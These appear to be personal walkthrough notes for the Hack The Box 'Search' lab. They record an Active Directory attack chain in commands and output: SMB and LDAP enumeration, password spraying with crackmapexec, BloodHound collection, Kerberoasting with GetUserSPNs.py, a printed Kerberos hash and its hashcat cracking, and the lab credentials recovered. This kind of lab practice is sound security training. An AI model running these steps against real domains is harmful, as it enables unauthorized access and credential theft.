 ============================( Password Policy Information for 10.10.11.129 )============================


[E] Unexpected error from polenum:



[+] Attaching to 10.10.11.129 using a NULL share

[+] Trying protocol 139/SMB...

	[!] Protocol failed: Cannot request session (Called Name:10.10.11.129)

[+] Trying protocol 445/SMB...

	[!] Protocol failed: SAMR SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.



[E] Failed to get password policy with rpcclient



 =======================================( Groups on 10.10.11.129 )=======================================


[+] Getting builtin groups:


[+]  Getting builtin group memberships:


[+]  Getting local groups:


[+]  Getting local group memberships:


[+]  Getting domain groups:


[+]  Getting domain group memberships:


 ==================( Users on 10.10.11.129 via RID cycling (RIDS: 500-550,1000-1050) )==================


[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.


 ===============================( Getting printer info for 10.10.11.129 )===============================

do_cmd: Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED


enum4linux complete on Mon Apr 17 15:05:01 2023




SMB:

 smbmap -H 10.10.11.129
[+] IP: 10.10.11.129:445	Name: 10.10.11.129                                      
                                
┌──(gabriel.hajdu㉿SVROLP01872)-[~/Practice/HTB/Search]
└─$ smbclient -N -L //10.10.11.129
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.129 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available


gobuster:

on port 80:

gobuster dir -u 10.10.11.129 -w /usr/share/wordlists/dirb/common.txt -t 64
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.129
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/04/17 15:09:19 Starting gobuster in directory enumeration mode
===============================================================
/certenroll           (Status: 301) [Size: 154] [--> http://10.10.11.129/certenroll/]
/certsrv              (Status: 401) [Size: 1293]
/css                  (Status: 301) [Size: 147] [--> http://10.10.11.129/css/]
/fonts                (Status: 301) [Size: 149] [--> http://10.10.11.129/fonts/]
/images               (Status: 301) [Size: 150] [--> http://10.10.11.129/images/]
/Images               (Status: 301) [Size: 150] [--> http://10.10.11.129/Images/]
/index.html           (Status: 200) [Size: 44982]
/js                   (Status: 301) [Size: 146] [--> http://10.10.11.129/js/]
/staff                (Status: 403) [Size: 1233]
Progress: 4614 / 4615 (99.98%)
===============================================================
2023/04/17 15:09:24 Finished
===============================================================




on port 443:

 gobuster dir -u https://10.10.11.129:443 -w /usr/share/wordlists/dirb/common.txt -t 64 -k
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://10.10.11.129:443
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/04/17 15:09:56 Starting gobuster in directory enumeration mode
===============================================================
/certenroll           (Status: 301) [Size: 159] [--> https://10.10.11.129:443/certenroll/]
/certsrv              (Status: 401) [Size: 1293]
/css                  (Status: 301) [Size: 152] [--> https://10.10.11.129:443/css/]
/fonts                (Status: 301) [Size: 154] [--> https://10.10.11.129:443/fonts/]
/Images               (Status: 301) [Size: 155] [--> https://10.10.11.129:443/Images/]
/images               (Status: 301) [Size: 155] [--> https://10.10.11.129:443/images/]
/index.html           (Status: 200) [Size: 44982]
/js                   (Status: 301) [Size: 151] [--> https://10.10.11.129:443/js/]
Progress: 4614 / 4615 (99.98%)
[ERROR] 2023/04/17 15:10:07 [!] Get "https://10.10.11.129:443/staff": local error: tls: no renegotiation
===============================================================
2023/04/17 15:10:07 Finished
===============================================================


Sites on port 80 and port 443 seem identical. While browsing the site, there is a picture that presents an potential username and password. Taking the username, I will create a list of potential users and use crackmapexec in order to see if I get a valid user and pass combo

crackmapexec smb 10.10.11.129 -u hope.txt -p IsolationIsKey? --continue-on-success
SMB         10.10.11.129    445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\hope:IsolationIsKey? STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\sharp:IsolationIsKey? STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\h.sharp:IsolationIsKey? STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\hope.s:IsolationIsKey? STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [+] search.htb\hope.sharp:IsolationIsKey? 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\hopesharp:IsolationIsKey? STATUS_LOGON_FAILURE 



now that we have a valid smb user, we can enumerate smb:

mbmap -u hope.sharp -p IsolationIsKey? -H 10.10.11.129
[+] IP: 10.10.11.129:445	Name: 10.10.11.129                                      
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	CertEnroll                                        	READ ONLY	Active Directory Certificate Services share
	helpdesk                                          	NO ACCESS	
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	RedirectedFolders$                                	READ, WRITE	
	SYSVOL                                            	READ ONLY	Logon server share 


The only interesting file is RedirectedFolders$, that contains a list of usernames.


	smbclient  //10.10.11.129/RedirectedFolders$ -U hope.sharp
Password for [WORKGROUP\hope.sharp]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  Dc        0  Mon Apr 17 15:18:14 2023
  ..                                 Dc        0  Mon Apr 17 15:18:14 2023
  abril.suarez                       Dc        0  Tue Apr  7 21:12:58 2020
  Angie.Duffy                        Dc        0  Fri Jul 31 16:11:32 2020
  Antony.Russo                       Dc        0  Fri Jul 31 15:35:32 2020
  belen.compton                      Dc        0  Tue Apr  7 21:32:31 2020
  Cameron.Melendez                   Dc        0  Fri Jul 31 15:37:36 2020
  chanel.bell                        Dc        0  Tue Apr  7 21:15:09 2020
  Claudia.Pugh                       Dc        0  Fri Jul 31 16:09:08 2020
  Cortez.Hickman                     Dc        0  Fri Jul 31 15:02:04 2020
  dax.santiago                       Dc        0  Tue Apr  7 21:20:08 2020
  Eddie.Stevens                      Dc        0  Fri Jul 31 14:55:34 2020
  edgar.jacobs                       Dc        0  Thu Apr  9 23:04:11 2020
  Edith.Walls                        Dc        0  Fri Jul 31 15:39:50 2020
  eve.galvan                         Dc        0  Tue Apr  7 21:23:13 2020
  frederick.cuevas                   Dc        0  Tue Apr  7 21:29:22 2020
  hope.sharp                         Dc        0  Thu Apr  9 17:34:41 2020
  jayla.roberts                      Dc        0  Tue Apr  7 21:07:00 2020
  Jordan.Gregory                     Dc        0  Fri Jul 31 16:01:06 2020
  payton.harmon                      Dc        0  Thu Apr  9 23:11:39 2020
  Reginald.Morton                    Dc        0  Fri Jul 31 14:44:32 2020
  santino.benjamin                   Dc        0  Tue Apr  7 21:10:25 2020
  Savanah.Velazquez                  Dc        0  Fri Jul 31 15:21:42 2020
  sierra.frye                        Dc        0  Thu Nov 18 03:01:46 2021
  trace.ryan                         Dc        0  Thu Apr  9 23:14:26 2020

		3246079 blocks of size 4096. 652558 blocks available
smb: \> 

Unauth LDAP search:

─(gabriel.hajdu㉿SVROLP01872)-[~/Practice/HTB/Search]
└─$ ldapsearch -H ldap://10.10.11.129 -x -s base namingcontexts
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingcontexts: DC=search,DC=htb
namingcontexts: CN=Configuration,DC=search,DC=htb
namingcontexts: CN=Schema,CN=Configuration,DC=search,DC=htb
namingcontexts: DC=DomainDnsZones,DC=search,DC=htb
namingcontexts: DC=ForestDnsZones,DC=search,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1

┌──(gabriel.hajdu㉿SVROLP01872)-[~/Practice/HTB/Search]
└─$ ldapsearch -H ldap://10.10.11.129 -x -b "DC=search,DC=htb"
# extended LDIF
#
# LDAPv3
# base <DC=search,DC=htb> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v4563

# numResponses: 1



LDAP search auth

(gabriel.hajdu㉿SVROLP01872)-[~/Practice/HTB/Search]
└─$ ldapsearch -H ldap://10.10.11.129 -D 'hope.sharp@search.htb' -w "IsolationIsKey?" -b "DC=search,DC=htb"
# extended LDIF
#
# LDAPv3
# base <DC=search,DC=htb> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# search.htb
dn: DC=search,DC=htb
objectClass: top
objectClass: domain
objectClass: domainDNS
distinguishedName: DC=search,DC=htb
instanceType: 5
whenCreated: 20200331141828.0Z
whenChanged: 20230417120157.0Z
subRefs: DC=ForestDnsZones,DC=search,DC=htb
subRefs: DC=DomainDnsZones,DC=search,DC=htb
subRefs: CN=Configuration,DC=search,DC=htb
uSNCreated: 4099
dSASignature:: AQAAACgAAAAAAAAAAAAAAAAAAAAAAAAALuF+8iYPiEqa2k7rioBtXg==
uSNChanged: 229440
name: search
objectGUID:: Nn7fq8YeDUGx3+HUqraCkQ==
replUpToDateVector:: AgAAAAAAAAATAAAAAAAAAH34XgudFDtMjtrPlh6Yxu4nkAIAAAAAAFpxy
 RcDAAAAalF1J9azjEy5ZAvzJKccZxVwAQAAAAAAtX5qFQMAAABTWFc4PCpLRZ1YURGJsi2yQOABAA
 AAAAA06esVAwAAAOBvQVsfHINJjC5A0XZa6yIM4AAAAAAAAAPGQRUDAAAAB8EYXvuBGUqt3uswa/b
 zLS3wAgAAAAAADsvQFwMAAAD3HVJnhhqeQZ8qlLTzrYxsIkACAAAAAACff6wXAwAAAHq/rooR0rBF
 r+5wHBWxUjUgIAIAAAAAADCGpRcDAAAA+5EklvdgOESCZR18n1177BvQAQAAAAAAziW8FQMAAABoD
 LOYai3HQoUMo7zlwG4FDxABAAAAAABAE0MVAwAAAD4BdpsdmbtOhOE3cr6qfF0r0AIAAAAAAMQCzB
 cDAAAAcfUeoeIY3ESbG5Me7/e6fiEwAgAAAAAAqTSmFwMAAADM46qmc8h4QIGnnfLO8ZeLNoADAAA
 AAAAzxk0aAwAAALOmQKjQQBZBl/CmcH6pLfcxMAMAAAAAAHY+0RcDAAAAnLZyzRlock+SB6/9y5Ij
 LjAgAwAAAAAASzzRFwMAAABAxAXQVMcXQrz7wpYQzJg/GKABAAAAAADx25cVAwAAADXrptCAI+tPj
 kX9oJxxIbMyQAMAAAAAADc9ZxgDAAAAnsLY8LNIhkuGFsTpFoRV6B8QAgAAAAAA1/uiFwMAAABcsQ
 7ypvZeRJhl7yTFvdEZEkABAAAAAAD3XFQVAwAAAC7hfvImD4hKmtpO64qAbV4IoAAAAAAAAF84MxU
 DAAAA
creationTime: 133262065172400283
forceLogoff: -9223372036854775808
lockoutDuration: -18000000000
lockOutObservationWindow: -18000000000
lockoutThreshold: 0
maxPwdAge: -9223372036854775808
minPwdAge: -864000000000
minPwdLength: 7
modifiedCountAtLastProm: 0
nextRid: 1001
pwdProperties: 0
pwdHistoryLength: 24
objectSid:: AQQAAAAAAAUVAAAAtaYuEIEY/l8B9o1v
serverState: 1
uASCompat: 1
modifiedCount: 1
auditingPolicy:: AAE=
nTMixedDomain: 0
rIDManagerReference: CN=RID Manager$,CN=System,DC=search,DC=htb
fSMORoleOwner: CN=NTDS Settings,CN=RESEARCH,CN=Servers,CN=Default-First-Site-N
 ame,CN=Sites,CN=Configuration,DC=search,DC=htb
systemFlags: -1946157056
wellKnownObjects: B:32:6227F0AF1FC2410D8E3BB10615BB5B0F:CN=NTDS Quotas,DC=sear
 ch,DC=htb
wellKnownObjects: B:32:F4BE92A4C777485E878E9421D53087DB:CN=Microsoft,CN=Progra
 m Data,DC=search,DC=htb
wellKnownObjects: B:32:09460C08AE1E4A4EA0F64AEE7DAA1E5A:CN=Program Data,DC=sea
 rch,DC=htb
wellKnownObjects: B:32:22B70C67D56E4EFB91E9300FCA3DC1AA:CN=ForeignSecurityPrin
 cipals,DC=search,DC=htb
wellKnownObjects: B:32:18E2EA80684F11D2B9AA00C04F79F805:CN=Deleted Objects,DC=
 search,DC=htb
wellKnownObjects: B:32:2FBAC1870ADE11D297C400C04FD8D5CD:CN=Infrastructure,DC=s
 earch,DC=htb
wellKnownObjects: B:32:AB8153B7768811D1ADED00C04FD8D5CD:CN=LostAndFound,DC=sea
 rch,DC=htb
wellKnownObjects: B:32:AB1D30F3768811D1ADED00C04FD8D5CD:CN=System,DC=search,DC
 =htb
wellKnownObjects: B:32:A361B2FFFFD211D1AA4B00C04FD7D83A:OU=Domain Controllers,
 DC=search,DC=htb
wellKnownObjects: B:32:AA312825768811D1ADED00C04FD8D5CD:CN=Computers,DC=search
 ,DC=htb
wellKnownObjects: B:32:A9D1CA15768811D1ADED00C04FD8D5CD:CN=Users,DC=search,DC=
 htb
objectCategory: CN=Domain-DNS,CN=Schema,CN=Configuration,DC=search,DC=htb
isCriticalSystemObject: TRUE
gPLink: [LDAP://cn={E9CE279C-52D0-4856-9073-82BAB4EB85AF},cn=policies,cn=syste
 m,DC=search,DC=htb;0][LDAP://CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Pol
 icies,CN=System,DC=search,DC=htb;0]
dSCorePropagationData: 16010101000000.0Z
otherWellKnownObjects: B:32:683A24E2E8164BD3AF86AC3C2CF3F981:CN=Keys,DC=search
 ,DC=htb
otherWellKnownObjects: B:32:1EB93889E40C45DF9F0C64D23BBB6237:CN=Managed Servic
 e Accounts,DC=search,DC=htb
masteredBy: CN=NTDS Settings,CN=RESEARCH,CN=Servers,CN=Default-First-Site-Name
 ,CN=Sites,CN=Configuration,DC=search,DC=htb
ms-DS-MachineAccountQuota: 10
msDS-Behavior-Version: 7
msDS-PerUserTrustQuota: 1
msDS-AllUsersTrustQuota: 1000
msDS-PerUserTrustTombstonesQuota: 10
msDs-masteredBy: CN=NTDS Settings,CN=RESEARCH,CN=Servers,CN=Default-First-Site
 -Name,CN=Sites,CN=Configuration,DC=search,DC=htb
msDS-IsDomainFor: CN=NTDS Settings,CN=RESEARCH,CN=Servers,CN=Default-First-Sit
 e-Name,CN=Sites,CN=Configuration,DC=search,DC=htb
msDS-NcType: 0
msDS-ExpirePasswordsOnSmartCardOnlyAccounts: TRUE
dc: search


... many other data:



We can use ldapdomaindump to get a more structural data:

┌──(gabriel.hajdu㉿SVROLP01872)-[~/Practice/HTB/Search]
└─$ ldapdomaindump -u search.htb\\hope.sharp -p 'IsolationIsKey?' 10.10.11.129 -o ldap/
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished


the newly created file contains a lot of information:


(gabriel.hajdu㉿SVROLP01872)-[~/Practice/HTB/Search/ldap]
└─$ ls
domain_computers_by_os.html  domain_computers.json  domain_groups.json  domain_policy.json  domain_trusts.json          domain_users.html
domain_computers.grep        domain_groups.grep     domain_policy.grep  domain_trusts.grep  domain_users_by_group.html  domain_users.json
domain_computers.html        domain_groups.html     domain_policy.html  domain_trusts.html  domain_users.grep

Tristan Davies is the account of the domain administrator. There are a bunch of accounts labeled as HelpDesk User , and there is another account web_svc which is described as "Temp account created by Help Desk"


With the creds that we already have, we can use bloodhound agianst the domain. There's a bunch of computer objects registered in the AD that I cant conncet to, which results in a bunch of errors


bloodhound-python -u hope.sharp -p IsolationIsKey? -d search.htb -c All -ns 10.10.11.129
INFO: Found AD domain: search.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: research.search.htb
INFO: Kerberos auth to LDAP failed, trying NTLM
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 113 computers
INFO: Connecting to LDAP server: research.search.htb
INFO: Kerberos auth to LDAP failed, trying NTLM
INFO: Found 107 users
INFO: Found 64 groups
INFO: Found 6 gpos
INFO: Found 27 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: Windows-100.search.htb
INFO: Querying computer: Windows-99.search.htb
INFO: Querying computer: Windows-98.search.htb
INFO: Querying computer: Windows-97.search.htb
INFO: Querying computer: Windows-96.search.htb
INFO: Querying computer: Windows-95.search.htb
INFO: Querying computer: Windows-94.search.htb
INFO: Querying computer: Windows-93.search.htb
INFO: Querying computer: Windows-92.search.htb
INFO: Querying computer: Windows-91.search.htb
WARNING: Could not resolve: Windows-100.search.htb: The resolution lifetime expired after 3.202 seconds: Server 10.10.11.129 UDP port 53 answered The DNS operation timed out.; Server 10.10.11.129 UDP port 53 answered The DNS operation timed out.
WARNING: Could not resolve: Windows-99.search.htb: The resolution lifetime expired after 3.208 seconds: Server 10.10.11.129 UDP port 53 answered The DNS operation timed out.; Server 10.10.11.129 UDP port 53 answered The DNS operation timed out.


Kerberoast:

Using bloodhound app, we are able to view the kerberoastable accounts:

first start neo4j:

sudo neo4j console
Directories in use:
home:         /usr/share/neo4j
config:       /usr/share/neo4j/conf
logs:         /etc/neo4j/logs
plugins:      /usr/share/neo4j/plugins
import:       /usr/share/neo4j/import
data:         /etc/neo4j/data
certificates: /usr/share/neo4j/certificates
licenses:     /usr/share/neo4j/licenses
run:          /var/lib/neo4j/run
Starting Neo4j.
2023-04-17 13:01:05.593+0000 INFO  Starting...
2023-04-17 13:01:06.230+0000 INFO  This instance is ServerId{3cd5b24c} (3cd5b24c-4c7b-4fee-afd3-788f68504a47)
2023-04-17 13:01:07.792+0000 INFO  ======== Neo4j 4.4.16 ========
2023-04-17 13:01:12.210+0000 INFO  Initializing system graph model for component 'security-users' with version -1 and status UNINITIALIZED
2023-04-17 13:01:12.230+0000 INFO  Setting up initial user from defaults: neo4j
2023-04-17 13:01:12.231+0000 INFO  Creating new user 'neo4j' (passwordChangeRequired=true, suspended=false)
2023-04-17 13:01:12.284+0000 INFO  Setting version for 'security-users' to 3
2023-04-17 13:01:12.294+0000 INFO  After initialization of system graph model component 'security-users' have version 3 and status CURRENT
2023-04-17 13:01:12.308+0000 INFO  Performing postInitialization step for component 'security-users' with version 3 and status CURRENT
2023-04-17 13:01:14.642+0000 INFO  Bolt enabled on localhost:7687.
2023-04-17 13:01:15.698+0000 INFO  Remote interface available at http://localhost:7474/
2023-04-17 13:01:15.706+0000 INFO  id: 82A1AB4B9EEFEAC45ED3050093CB413711813AE96E01760D9E64ECCFA081E24A
2023-04-17 13:01:15.706+0000 INFO  name: system
2023-04-17 13:01:15.706+0000 INFO  creationDate: 2023-04-17T13:01:09.446Z
2023-04-17 13:01:15.707+0000 INFO  Started.
2023-04-17 13:02:46.575+0000 WARN  The client is unauthorized due to authentication failure.


there are 2 kerboroastable accounts, web_svc adn krbtgt accounts

As Bloodhound identified kerberoastable users, I will go ahead and kerberoast. We need the creds from hope.sharp and then we user GetUserSPNs.py. This will return a hash for the web_svc account.


 python GetUserSPNs.py -request -dc-ip 10.10.11.129 search.htb/hope.sharp 
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
ServicePrincipalName               Name     MemberOf  PasswordLastSet             LastLogon  Delegation 
---------------------------------  -------  --------  --------------------------  ---------  ----------
RESEARCH/web_svc.search.htb:60001  web_svc            2020-04-09 15:59:11.329031  <never>               



[-] CCache file is not found. Skipping...
$krb5tgs$23$*web_svc$SEARCH.HTB$search.htb/web_svc*$19afd840275e0df00450c595f6eab8ef$a45cb3719e6ba66f0be3b8aad2d95412209ab8a2e2761090149a5f07c2e1603c230dc4b26c34bfb17b53881b9a8313e3967ed2a929df9d955f43a8d2c6dfe76d30d87fb4fb9888437d05e879ac64dc864b29c1478ac5d9c22a629fe13e31e038e173af0efb41f0f8b249344f66016a6abecbcde3e2285f097ed0fdb876e0daef1e3a0641f5e9bd1fc61d4d7baf4d537970b81f121c7e2bec3a493b37987aed9db6e119f41f74fc16e718e8aed19628a42e8e984d936661e8408c17da0e4ed29a99088af3c855d6acd15b39dca79bcab6d854e41f33b16dac095dab6fd029096d4af6b4dc589e4fb8dfb2205b365e26b233a7bddb8695bd2057a4b31945a3e1f8f6d7969c9de5b5c49888be131af4a8fa14e26c69ce2d02e980e33d127f8b1d1ca290acdbffb75cca3f9e8ae9350ecbfd7b092af8bb65d2b54c14b62b94b2606fa2bb16025f90e33552e8ce2a2e3a6713036bca1696217a51fc5afc5b9122f8b1f2d01c4aad6e5e40339f388432ec6a7c56a85111c16ddd44f6ca9bd4e10df6c4556a66f498bcaf62ee7bcce5fd4a4be44c7638968435cae5d6d5530ee700b2b5ccdae261848e48b7325a2130ffc1be4d611c12ed9a5ac11d5d4606505e6efaf21b7e621ebb330f844d02a99ded12e5993d20eb5609349f24e98715e7087ae31c309ee10cc3ad3e8978eebbbb2ae7c93ac375c7bdcbaa6264f6b2215bc6ccd27cffb086a708686ce5aa4ca71fe8922b7caad085c9df31ece276894a08e81831b646e11250d18e04c87eb172080a52fef346a87466df41c9d2f218db72f0dee7be9edc1939ab0810e8fb016be6e6d050381d4ff3e272d06255709f40329a3adbb31e184c85d3fdd32a3985f85b4f370a56a32672cf3a0b38d2617970a13a6497af3566a3a5abd4ddfa45bcb7511a4d5f4ae109b9066636a7b3f3e22ddeb58ab45bd378e1fe8d3f45cc9104d3ed5c48aa11653072cdbcb592f7f3df770b28b931bf768542616b02d8b54a28e823e101ed46b60febb38f7e9a6163c8f869369730f6d07115399ff99fabd8045aadb4d59e7a6a35b5cd68799025d203b87f1b2a44e853a91875a40ac890fe8d1ac97819f3ed5236f5cafddd66422dbbf92380a6e6725791b9239b0a5e0f6d24bc3e7e1a5268ecaee0847ea41c53ea47876ae7e704f575644d499206d490f718657ecfff0ab52266aa986c440e452201aaab9186dacf86c0a6e56a97b19222c8d41a80d9fa9d12cfcee5140a0d799268c25e1a8ed5ca8541602af749d3f5c9d4741fe4069b0c9bcee28c767ef0bff4af20569c838e1242fd613727290d03560c7d56223270f2a1d78e41d612d95159a2613a369eda614e7cd5343455e8ff62bda16d8e8c35dc862a0ac0f3179a69bf4537f1421af18d3d03164cfc867f6deac6dda270ea469461b8161199fe6e8f794e978910fae3f65723765a4471244e8f77de7f6f56f8bd10e959435e


now that we have the hash, we save it to another file and we use hashcat to crack it

hashcat -m 13100 web_svc.hash /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-haswell-Intel(R) Core(TM) i7-9750H CPU @ 2.60GHz, 6845/13754 MB (2048 MB allocatable), 12MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 3 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 2 secs

Cracking performance lower than expected?                 

* Append -O to the commandline.
  This lowers the maximum supported password/salt length (usually down to 32).

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

$krb5tgs$23$*web_svc$SEARCH.HTB$search.htb/web_svc*$19afd840275e0df00450c595f6eab8ef$a45cb3719e6ba66f0be3b8aad2d95412209ab8a2e2761090149a5f07c2e1603c230dc4b26c34bfb17b53881b9a8313e3967ed2a929df9d955f43a8d2c6dfe76d30d87fb4fb9888437d05e879ac64dc864b29c1478ac5d9c22a629fe13e31e038e173af0efb41f0f8b249344f66016a6abecbcde3e2285f097ed0fdb876e0daef1e3a0641f5e9bd1fc61d4d7baf4d537970b81f121c7e2bec3a493b37987aed9db6e119f41f74fc16e718e8aed19628a42e8e984d936661e8408c17da0e4ed29a99088af3c855d6acd15b39dca79bcab6d854e41f33b16dac095dab6fd029096d4af6b4dc589e4fb8dfb2205b365e26b233a7bddb8695bd2057a4b31945a3e1f8f6d7969c9de5b5c49888be131af4a8fa14e26c69ce2d02e980e33d127f8b1d1ca290acdbffb75cca3f9e8ae9350ecbfd7b092af8bb65d2b54c14b62b94b2606fa2bb16025f90e33552e8ce2a2e3a6713036bca1696217a51fc5afc5b9122f8b1f2d01c4aad6e5e40339f388432ec6a7c56a85111c16ddd44f6ca9bd4e10df6c4556a66f498bcaf62ee7bcce5fd4a4be44c7638968435cae5d6d5530ee700b2b5ccdae261848e48b7325a2130ffc1be4d611c12ed9a5ac11d5d4606505e6efaf21b7e621ebb330f844d02a99ded12e5993d20eb5609349f24e98715e7087ae31c309ee10cc3ad3e8978eebbbb2ae7c93ac375c7bdcbaa6264f6b2215bc6ccd27cffb086a708686ce5aa4ca71fe8922b7caad085c9df31ece276894a08e81831b646e11250d18e04c87eb172080a52fef346a87466df41c9d2f218db72f0dee7be9edc1939ab0810e8fb016be6e6d050381d4ff3e272d06255709f40329a3adbb31e184c85d3fdd32a3985f85b4f370a56a32672cf3a0b38d2617970a13a6497af3566a3a5abd4ddfa45bcb7511a4d5f4ae109b9066636a7b3f3e22ddeb58ab45bd378e1fe8d3f45cc9104d3ed5c48aa11653072cdbcb592f7f3df770b28b931bf768542616b02d8b54a28e823e101ed46b60febb38f7e9a6163c8f869369730f6d07115399ff99fabd8045aadb4d59e7a6a35b5cd68799025d203b87f1b2a44e853a91875a40ac890fe8d1ac97819f3ed5236f5cafddd66422dbbf92380a6e6725791b9239b0a5e0f6d24bc3e7e1a5268ecaee0847ea41c53ea47876ae7e704f575644d499206d490f718657ecfff0ab52266aa986c440e452201aaab9186dacf86c0a6e56a97b19222c8d41a80d9fa9d12cfcee5140a0d799268c25e1a8ed5ca8541602af749d3f5c9d4741fe4069b0c9bcee28c767ef0bff4af20569c838e1242fd613727290d03560c7d56223270f2a1d78e41d612d95159a2613a369eda614e7cd5343455e8ff62bda16d8e8c35dc862a0ac0f3179a69bf4537f1421af18d3d03164cfc867f6deac6dda270ea469461b8161199fe6e8f794e978910fae3f65723765a4471244e8f77de7f6f56f8bd10e959435e:@3ONEmillionbaby
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*web_svc$SEARCH.HTB$search.htb/web_svc*...59435e
Time.Started.....: Mon Apr 17 16:28:39 2023 (8 secs)
Time.Estimated...: Mon Apr 17 16:28:47 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1362.1 kH/s (5.77ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 11501568/14344385 (80.18%)
Rejected.........: 0/11501568 (0.00%)
Restore.Point....: 11489280/14344385 (80.10%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: @5945482 -> 9c2219z11sj2787
Hardware.Mon.#1..: Temp: 46c Util: 70%

Started: Mon Apr 17 16:27:51 2023
Stopped: Mon Apr 17 16:28:49 2023


pass is @3ONEmillionbaby for web_svc user:


we can check this using crackmapexec:

crackmapexec smb 10.10.11.129 -u web_svc -p '@3ONEmillionbaby'
SMB         10.10.11.129    445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.129    445    RESEARCH         [+] search.htb\web_svc:@3ONEmillionbaby 


It works.

Remember that this account was created for Helpdesk . We can try to see if other helpdesk accounts use this password. for this we will create a new user list from the users that we found on smb enumeration, using the 2 passwords that we have:

 crackmapexec smb 10.10.11.129 -u users.txt -p passwords.txt --continue-on-success
SMB         10.10.11.129    445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\abril.suarez:IsolationIsKey? STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\abril.suarez:@3ONEmillionbaby STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Angie.Duffy:IsolationIsKey? STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Angie.Duffy:@3ONEmillionbaby STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Antony.Russo:IsolationIsKey? STATUS_LOGON_FAILURE 
